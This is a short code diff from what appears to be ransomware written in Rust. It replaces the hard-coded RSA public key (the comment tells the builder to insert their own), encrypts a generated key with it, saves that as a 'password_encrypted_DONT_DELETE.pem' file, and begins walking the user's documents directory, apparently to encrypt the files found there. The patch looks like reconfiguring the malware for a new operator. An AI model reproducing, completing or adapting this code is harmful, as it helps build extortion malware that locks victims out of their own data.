@@ -87,22 +87,22 @@ fn main() {
         }
     };
 
-    // Change this for your public RSA key
+    // Change this for your public RSA key, no tabs at the begining, just has shown
     let pem = "-----BEGIN PUBLIC KEY-----
-MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAlpnmNvyemuON6QMsVZZX
-29vXAc0rapY0XBqN1qdzf/UoeBDV5VYMh+E4aq0XhDDHEQCLkHmoLgpuP2mVnX3O
-P/qNDOuNF2yIMQqRThQ3bTjAQa5MurgWBfZOU8up+RYAD82Lc50amIIYGw368Wep
-DN0oPWCRjWF+9AXlfkBcN3PMLYH0uWsBoT6l6ajb5HO1HUX+hxXm3UCxRFr3YTeL
-CsVPf8KPVZz+xHJ4C7qLsitsVyHsvHokOyrJ1ZY0W7GIXT8+fwlrzuzWCTvOMs7n
-wLG0EUDUsMEbuepjv0ZBtZy+MWdkti9Rfu0Gih247HHDfX6LKwgDJAR7po1wVE9B
-SwIDAQAB
+MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA5R3fLW2eYS9mnDIYjt4/
+sFjgKEb+3j//0RZGjQTN62BgLbAUL4kmFhW/yzCqaF5yCs0XA6ojBTM+4wgW737G
+sHExpoDcVOm2J/ydJPoCULhkANmCM3OQ4S/fLk9Ggakj91Gs7VDtuoZJTiE9YatS
+lU8Bz0q6XlnPaN8cp4BqlDsaSK1s1IqOefvuKW8KuQyf6CrrM0SfMznfmUiRaUeV
+1/l9OtsAhC/r+EOr+Ytjupd2REUq2Ym7sAz/8zk3W026InzkMtdRBsZDkuqpf0YE
+9SxqXddFG9V4DA0jqOxun+DI9qfmv2chn+yH8i9QcxGpjJD5WKgSD9oJpQfrbSNM
+DwIDAQAB
 -----END PUBLIC KEY-----";
 
     let public_key = RsaPublicKey::from_public_key_pem(pem).unwrap();
     let mut rng = rand::thread_rng();
 
     let passenc = public_key.encrypt(&mut rng, Pkcs1v15Encrypt, &key_bytes).unwrap();
-    let _ = save_key_to_file(&passenc, "password_encrypted_DONT_DELETE.key");
+    let _ = save_key_to_file(&passenc, "password_encrypted_DONT_DELETE.pem");
 
     for entry in WalkDir::new(documents_dir)
         .into_iter()
